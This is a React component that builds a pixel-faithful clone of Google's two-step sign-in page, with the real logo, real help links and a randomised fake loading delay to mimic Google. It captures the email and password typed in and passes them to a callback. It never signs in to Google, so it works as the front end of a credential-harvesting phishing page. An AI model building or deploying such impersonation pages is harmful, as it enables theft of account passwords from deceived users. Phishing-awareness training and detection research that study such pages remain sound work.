'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { useEffect, useRef, useState } from 'react';
import { useForm } from 'react-hook-form';

import { Credentials } from '@/core/types';
import { getTimeout } from '@/core/utils';

import GoogleFormField from './GoogleFormField';
import GoogleProgressbar from './GoogleProgressbar';
import { googleSignInSchema, GoogleSignInSchema } from '../schemas';

import './GoogleSignInForm.css';
import { GoogleLogo } from '@/core/features/google/components/icons/GoogleLogo';
import { UserIcon } from '@/core/features/google/components/icons/UserIcon';
import { CheckboxIcon } from '@/core/features/google/components/icons/CheckboxIcon';

interface GoogleSignInFormProps {
  onSubmit: (credentials: Credentials) => void;
}

export const GoogleSignInForm = ({ onSubmit }: GoogleSignInFormProps) => {
  const {
    trigger,
    handleSubmit,
    setValue,
    getValues,
    // reset,
    formState: { errors },
  } = useForm<GoogleSignInSchema>({
    resolver: zodResolver(googleSignInSchema),
    defaultValues: {
      email: '',
      password: '',
    },
  });

  const [step, setStep] = useState(1);
  const [pwdVisible, setPwdVisible] = useState(false);
  const [fetching, setFetching] = useState(false);

  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const handleNextBtnClick = async () => {
    const isValid = await trigger('email');
    if (isValid) {
      await executeAfterFetching(() => {
        setStep(2);
        setTimeout(() => passwordRef.current?.focus(), 50); // wait for DOM update
      });
    }
  };

  const handleEmailChange = (newValue: string) => {
    setValue('email', newValue, { shouldValidate: false });
  };

  const handlePasswordChange = (newValue: string) => {
    setValue('password', newValue, { shouldValidate: false });
  };

  const togglePasswordVisibility = () => {
    setPwdVisible((prev) => !prev);
  };

  const executeAfterFetching = async (cb: () => void) => {
    const delay = getTimeout(1500, 3000, 500);
    setFetching(true);
    setTimeout(() => {
      setFetching(false);
      cb();
    }, delay);
  };

  const onSubmitted = async (credentials: GoogleSignInSchema) => {
    const { email, password } = credentials;
    setFetching(true);

    const formatedCredentials: Credentials = {
      email: email.toLowerCase(),
      password,
    };

    console.log('formatedCredentials', formatedCredentials);

    onSubmit(formatedCredentials);
    // reset();
  };

  useEffect(() => {
    emailRef.current?.focus();
  }, []);

  return (
    <div className="g-form font-google-sans">
      <GoogleProgressbar isActive={fetching} />

      {/* Header */}
      <div className="g-form_header">
        <GoogleLogo />
      </div>

      {/* Content */}
      <form className="g-form_form" onSubmit={handleSubmit(onSubmitted)}>
        <div className="g-form_content">
          <div className="g-form_column">
            <div data-step={step} className="g-form_heading">
              <h1 className="g-form_title">
                {step === 1 && 'Sign in'}
                {step === 2 && 'Welcome'}
              </h1>
              <div className="g-form_subtitle">
                {step === 1 && 'Use your Google Account'}
                {step === 2 && (
                  <div className="g-form_user-email">
                    <UserIcon className="opacity-90" />
                    {getValues('email')}
                  </div>
                )}
              </div>
            </div>
          </div>

          <div className="g-form_column">
            {/* Step 1: Email */}
            {step === 1 && (
              <div className="g-form_email-field">
                <GoogleFormField
                  name="email"
                  label="Email"
                  type="email"
                  onChange={handleEmailChange}
                  onPressEnter={handleNextBtnClick}
                  error={errors.email?.message}
                  inputRef={emailRef}
                />

                <div className="g-form_description">
                  <div className="g-form_link g-form_field_link">
                    <a
                      href="https://accounts.google.com/signin/v2/usernamerecovery"
                      target="_blank"
                    >
                      Forgot email?
                    </a>
                  </div>

                  <div>
                    Not your computer? Use a Private Window to sign in.
                    <br />
                    <a
                      href="https://support.google.com/accounts?p=signin_privatebrowsing"
                      target="_blank"
                    >
                      Learn more about using Guest mode
                    </a>
                  </div>
                </div>
              </div>
            )}

            {/* Step 2: Password */}
            {step === 2 && (
              <div className="g-form_password-field">
                <GoogleFormField
                  name="password"
                  label="Enter your password"
                  type={pwdVisible ? 'text' : 'password'}
                  onChange={handlePasswordChange}
                  error={errors.password?.message}
                  inputRef={passwordRef}
                />

                <div className="g-form_description">
                  <div className="g-form_toggle-password">
                    <div
                      onClick={togglePasswordVisibility}
                      className="g-form_pointer"
                    >
                      {pwdVisible ? (
                        <CheckboxIcon className="text-gform-link" />
                      ) : (
                        <div className="g-form_checkbox"></div>
                      )}
                    </div>

                    <div
                      onClick={togglePasswordVisibility}
                      className="g-form_pointer"
                    >
                      Show password
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Footeer */}
        <div className="g-form_footer">
          {step === 1 && (
            <>
              <a href="https://support.google.com/accounts" target="_blank">
                Create account
              </a>
              <button
                onClick={handleNextBtnClick}
                className="g-form_button"
                type="button"
              >
                Next
              </button>
            </>
          )}

          {step === 2 && (
            <>
              <a
                href="https://myaccount.google.com/signinoptions/password"
                target="_blank"
              >
                Forgot password?
              </a>
              <button className="g-form_button" type="submit">
                Next
              </button>
            </>
          )}
        </div>
      </form>
    </div>
  );
};
